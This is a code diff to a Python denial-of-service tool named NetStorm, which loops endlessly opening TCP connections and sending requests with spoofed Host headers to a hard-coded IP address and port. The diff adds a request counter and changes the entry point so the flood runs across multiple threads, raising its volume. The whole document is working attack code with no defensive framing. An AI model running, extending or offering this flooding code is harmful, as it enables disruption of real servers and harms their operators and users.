@@ -16,8 +16,9 @@ class NetStorm:
         self.n_thread = n_thread
 
     def attack(self):
+        print(f"[+] Attack started")
+        n_request = 0
         while True:
-            print(f"[+] Attack started")
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.connect((self.target, self.port))
 
@@ -30,6 +31,8 @@ class NetStorm:
                 (f"Host: {self.fake_ip()} \r\n\r\n").encode("ascii"),
                 (self.target, self.port)
             )
+            n_request += 1
+            print(f"[+] Request sent: {n_request}", end="\r")
 
     def thread(self):
         print(f"[+] Starting thread: {self.n_thread}")
@@ -60,4 +63,4 @@ if __name__ == "__main__":
     host = "104.22.54.228"
     port = 8080
     netstorm = NetStorm(host, port)
-    netstorm.attack()
+    netstorm.thread()
